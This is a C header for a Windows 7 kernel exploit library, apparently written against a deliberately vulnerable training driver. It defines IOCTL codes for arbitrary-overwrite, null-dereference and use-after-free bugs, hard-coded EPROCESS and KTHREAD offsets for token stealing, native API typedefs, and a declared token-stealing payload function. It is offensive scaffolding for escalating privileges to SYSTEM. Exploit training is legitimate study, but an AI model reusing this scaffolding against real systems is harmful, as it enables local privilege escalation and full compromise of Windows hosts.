#ifndef KERNELEXPLOITLIBRARY_H__
#define KERNELEXPLOITLIBRARY_H__

#include <Windows.h>

#define KERNEL_DRIVER_LINK							L"\\\\.\\KernelExploitDriver"
#define ARBITRARY_OVERWRITE_CONTROL_CODE			CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define NULL_POINTER_DEREFERENCE_CONTROL_CODE		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
#define USE_AFTER_FREE_CONTROL_CODE					CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)

#define _WIN7_X86_EXPLOIT 0x86
//#define _WIN7_X64_EXPLOIT 0x64

#ifdef _WIN7_X86_EXPLOIT
#define SYSTEM_PID		0x00000004			// System.exe ProcessId (0x4)
#define KTHREAD_OFFSET	0x00000124			// KPCR(fs:[0])->_KPRCB->_KTHREAD (0x124)
#define EPROCESS_OFFSET	0x00000050			// _KTHREAD->_KAPC_STATE->_KPROCESS (0x50)
#define PID_OFFSET		0x000000B4			// _EPROCESS->UniqueProcessId (0xB4)
#define FLINK_OFFSET	0x000000B8			// _EPROCESS->ActiveProcessLinks (0xB8)
#define TOKEN_OFFSET	0x000000F8			// // _EPROCESS->_EX_FAST_REF (0xF8)
#elif _WIN7_X64_EXPLOIT
#define SYSTEM_PID		0x0000000000000004	// System.exe ProcessId (0x4)
#define KTHREAD_OFFSET	0x0000000000000188	// _KPCR(gs:[0])->_KPRCB->_KTHREAD (0x180 + 0x8 = 0x188)
#define EPROCESS_OFFSET	0x0000000000000070	// _KTHREAD->_KAPC_STATE->_KPROCESS (0x50 + 0x20 = 0x70)
#define PID_OFFSET		0x0000000000000180	// _EPROCESS->UniqueProcessId (0x180)
#define FLINK_OFFSET	0x0000000000000188	// _EPROCESS->ActiveProcessLinks (0x188)
#define TOKEN_OFFSET	0x0000000000000208	// _EPROCESS->_EX_FAST_REF (0x208)
#endif

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	PVOID  Unknown1;
	PVOID  Unknown2;
	PVOID  Base;
	ULONG  Size;
	ULONG  Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
}SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG ModulesCount;
	SYSTEM_MODULE_INFORMATION_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11,
	SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI *NTQUERYSYSTEMINFORMATION)(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength
);

typedef NTSTATUS(WINAPI *NTQUERYINTERVALPROFILE)(
	_In_ ULONG ProfileSource,
	_Out_ PULONG Interval
);

typedef NTSTATUS(WINAPI *NTALLOCATEVIRTUALMEMORY)(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID *BaseAddress,
	_In_ ULONG ZeroBits,
	_Inout_ PULONG AllocationSize,
	_In_ ULONG AllocationType,
	_In_ ULONG Protect
);

typedef NTSTATUS(WINAPI *NTFREEVIRTUALMEMORY)(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID *BaseAddress,
	_Inout_ PULONG RegionSize,
	_In_ ULONG FreeType
);

BOOLEAN
SendIOCTL(
	_In_ ULONG ulControlCode,
	_In_ PVOID pvSendData,
	_In_ ULONG ulSendDataSize
);

PVOID
GetNativeFuncAddress(
	_In_ PCHAR pchNativeFunctionName
);

#ifdef _WIN7_X86_EXPLOIT
VOID
TokenStealingPayloadWin7(VOID);
#elif _WIN7_X64_EXPLOIT
extern "C" void
TokenStealingPayloadWin7();
#endif

#endif